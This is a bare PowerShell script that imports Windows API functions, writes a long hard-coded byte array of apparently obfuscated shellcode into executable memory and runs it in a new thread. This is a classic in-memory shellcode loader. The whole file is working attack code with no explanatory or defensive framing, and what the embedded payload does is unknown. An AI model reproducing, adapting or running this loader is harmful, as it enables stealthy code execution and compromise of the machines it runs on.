$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Win32

[Byte[]] $buf = 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0xcf, 0x0, 0x0, 0x0, 0x4d, 0x87, 0xf6, 0x48, 0x89, 0xec, 0x5d, 0xe8, 0xfd, 0x1, 0x0, 0x0, 0x57, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x57, 0x48, 0x89, 0xec, 0x5d, 0x4c, 0x19, 0xe7, 0x5f, 0x5, 0xd1, 0xba, 0x23, 0xc7, 0xc1, 0xd1, 0x1, 0xc0, 0xd4, 0x8, 0x0, 0xdc, 0x1, 0x4, 0x54, 0x0, 0x45, 0x30, 0x24, 0xe, 0x45, 0x2, 0x24, 0xe, 0xe2, 0xf6, 0xc9, 0x1c, 0x9f, 0x3e, 0x9d, 0x37, 0xcb, 0x83, 0xf8, 0xdc, 0xac, 0x44, 0x84, 0x84, 0x84, 0x2, 0xa3, 0xf0, 0x31, 0x5d, 0xef, 0x3e, 0x68, 0xde, 0xcf, 0xdd, 0x38, 0x6e, 0xc1, 0x53, 0xa3, 0xeb, 0x5c, 0xee, 0xe6, 0xa8, 0x83, 0x91, 0x21, 0x55, 0x1e, 0x4c, 0x9c, 0xca, 0xb9, 0x8e, 0x30, 0x60, 0xcd, 0xfa, 0xa3, 0x8b, 0x3a, 0xe2, 0x2e, 0xd0, 0x49, 0x31, 0x2b, 0xc7, 0xe7, 0x24, 0xd5, 0x2, 0x8f, 0xcc, 0xcd, 0xc8, 0xd0, 0xb9, 0xeb, 0x8, 0x59, 0xd, 0x66, 0x34, 0x2, 0x5, 0x37, 0x8b, 0xc3, 0x22, 0xec, 0x67, 0xd7, 0x5f, 0x5f, 0x5f, 0x5f, 0x17, 0x12, 0x2a, 0x90, 0xe7, 0xaf, 0xe, 0xde, 0x88, 0xf3, 0xbb, 0x1b, 0x5f, 0xd4, 0x54, 0x62, 0x2b, 0x8a, 0x94, 0x77, 0x91, 0x25, 0xd8, 0x91, 0xce, 0x25, 0x1, 0x9, 0x41, 0xbc, 0x50, 0xdd, 0xea, 0x93, 0x9b, 0x2a, 0x92, 0xbc, 0xfd, 0xba, 0x6b, 0x64, 0x25, 0xa2, 0x13, 0xab, 0xa3, 0x14, 0xd5, 0x95, 0x6, 0x2, 0x16, 0x9c, 0x99, 0x1e, 0x2f, 0x5a, 0x72, 0xa2, 0xd0, 0x5b, 0xd3, 0xe7, 0xac, 0xd, 0x11, 0x77, 0x20, 0x93, 0x1f, 0x57, 0x3, 0x8, 0x30, 0xaa, 0xe3, 0xc2, 0x90, 0xcd, 0x46, 0x32, 0x3a, 0x70, 0x71, 0x21, 0x50, 0x86, 0x37, 0x4f, 0xe1, 0x4, 0x5c, 0x9d, 0xc5, 0x72, 0xab, 0xca, 0x0, 0x46, 0x35, 0x99, 0x39, 0x74, 0xd8, 0xa7, 0xb7, 0xef, 0xc, 0xa1, 0xfb, 0xa3, 0x4, 0xc4, 0x81, 0x28, 0x27, 0x26, 0x21, 0x7a, 0xcb, 0x89, 0xf8, 0x6b, 0xa5, 0xf4, 0xa7, 0x95, 0x95, 0x15, 0xa8, 0xfc, 0xa5, 0xa0, 0xb6, 0xfc, 0x7d, 0x51, 0xf1, 0xf0, 0xf0, 0xee, 0x97, 0xdc, 0xb9, 0x88, 0x30, 0x32, 0x8, 0xd9, 0x6a, 0xaa, 0xfa, 0x2c, 0x29, 0x40, 0x82, 0xcb, 0xba, 0x5e, 0x0, 0x69, 0x16, 0x27, 0x1d, 0xad, 0x92, 0xaa, 0x51, 0xc, 0xc1, 0x8d, 0xf0, 0xda, 0xb0, 0xb1, 0xb0, 0xb0, 0xe, 0x57, 0xe6, 0x1a, 0x33, 0x23, 0x48, 0xb6, 0xa1, 0x74, 0x84, 0xca, 0x67, 0x44, 0xd, 0x3e, 0x8f, 0x4f, 0xf7, 0x88, 0x48, 0xfe, 0x77, 0x25, 0x91, 0x6e, 0x2e, 0x54, 0xdd, 0x9a, 0x9b, 0xdd, 0x27, 0x96, 0x89, 0x95, 0x40, 0x5, 0x4d, 0x3a, 0xf9, 0x93, 0x3, 0xb2, 0xd2, 0x9c, 0xd1, 0xa3, 0xeb, 0x90, 0x69, 0xd4, 0x4c, 0x95, 0xc8, 0x3a, 0xa3, 0x52, 0x77, 0x3f, 0x3e, 0xfa, 0xba, 0xb8, 0xb8, 0x26, 0xf, 0x37, 0x8a, 0xe7, 0x83, 0x83, 0x83, 0x83, 0x83, 0x3, 0xa2, 0xf0, 0x31, 0x51, 0x19, 0x4c, 0x0, 0x57, 0xfe, 0x11, 0x1a, 0xab, 0x6b, 0xf9, 0xc2, 0x1b, 0x5a, 0xca, 0xd0, 0xa0, 0x38, 0xff, 0xb3, 0x17, 0x43, 0x40, 0xb1, 0xe1, 0x6c, 0x20, 0xf4, 0xe0, 0x26, 0xd6, 0x3e, 0x64, 0xe1, 0xe7, 0x31, 0x61, 0x80, 0xce, 0x6f, 0xbf, 0xfe, 0x2c, 0x99, 0x66, 0x24, 0x45, 0x85, 0x32, 0xcd, 0xf5, 0xa6, 0xaf, 0x6e, 0x10, 0x19, 0xd6, 0x67, 0x1d, 0x54, 0x66, 0x55, 0x2b, 0x2a, 0xff, 0xb7, 0x66, 0x24, 0x92, 0x69, 0x93, 0x4, 0x88, 0xb5, 0xf, 0x7, 0x7e, 0x63, 0xfb, 0xfa, 0xcf, 0x74, 0x7a, 0x8f, 0x81, 0xd7, 0x66, 0x90, 0x34, 0x59, 0xda, 0xb7, 0xa6, 0x63, 0x2b, 0x20, 0x94, 0xbc, 0x7c, 0x82, 0xfe, 0xf4, 0x82, 0x79, 0x51, 0x1a, 0xdf, 0x5a, 0x19, 0xea, 0x46, 0xd5, 0xbf, 0x3f, 0x64, 0x15, 0x18, 0x3c, 0x3b, 0x59, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0xd0, 0x0, 0x0, 0x0, 0x48, 0xf, 0x44, 0xc9, 0x48, 0x89, 0xec, 0x5d, 0xeb, 0x2, 0xee, 0x9c, 0xc1, 0x49, 0x11, 0xc2, 0x48, 0xf, 0x46, 0xc9, 0xc1, 0x41, 0x15, 0x20, 0xc1, 0x41, 0x19, 0x8c, 0x81, 0x41, 0x1d, 0x59, 0x7, 0xfc, 0xab, 0x51, 0xc3
$size = $buf.Length
[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
